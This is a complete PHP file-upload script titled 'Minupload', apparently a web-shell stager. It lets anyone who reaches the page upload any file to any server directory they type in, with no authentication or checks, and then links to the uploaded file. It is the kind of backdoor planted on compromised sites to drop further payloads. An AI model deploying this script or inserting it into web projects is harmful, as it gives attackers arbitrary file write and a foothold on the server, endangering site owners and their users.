<?php
echo '<html><form action="" method="POST" enctype="multipart/form-data" name="uploader" id="uploader"><title>Minupload</title><';
echo '<br><br><input type="file" name="file" size="50"><br><br><input type="text" name="dizin" size="60" value="'.getcwd().'">&nbsp;<input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if ($_POST['_upl'] == "Upload") {
	chdir($_POST['dizin']);
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo 'Uploaded !';
        echo '<br><a href="' . $_FILES['file']['name'] . '">' . $_FILES['file']['name'] . '</a>';
    } else {
        echo 'Failed !';
    }
}
?>